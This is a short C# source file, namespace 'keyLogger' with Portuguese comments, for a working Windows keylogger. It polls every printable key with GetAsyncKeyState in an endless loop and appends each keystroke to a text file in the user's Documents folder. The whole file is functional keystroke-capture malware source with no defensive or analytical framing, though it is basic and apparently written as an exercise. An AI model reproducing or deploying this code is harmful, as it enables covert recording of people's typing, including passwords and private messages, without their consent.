using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace keyLogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 LIntCaracter);
        
        static void Main(string[] args)
        {
            int LIntKeyState;

            String LStrDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string LStrFile = LStrDirectory + "/keylogger.txt";

            FCriarArquivo(LStrDirectory, LStrFile);


            // 1 - Pegar as teclas digitadas e exibir no console

            while (true){
                //pause and let other programs get  a chance to run
                Thread.Sleep(5);

                //check all keys for their state
                for (int LIntCaracter = 32; LIntCaracter < 127; LIntCaracter++) {                    
                    LIntKeyState = GetAsyncKeyState(LIntCaracter);                                                       

                    if (LIntKeyState == 32769) {
                        // 2 - Jogar as teclas digitadas em uma arquivo de texto            

                        using (StreamWriter LSw = File.AppendText(LStrFile)) {
                            LSw.Write((char)LIntCaracter + ". ");                            
                        }
                    }
                }
            }
        }
     
        public static bool FCriarArquivo(string PvStrDirectory, string PvStrFile) {            
            if (!Directory.Exists(PvStrDirectory))
                Directory.CreateDirectory(PvStrDirectory);

            if (!File.Exists(PvStrFile)) {
                using (StreamWriter LSw = File.CreateText(PvStrFile)) {                        
                }
            }          
            return true;
        }
    }
}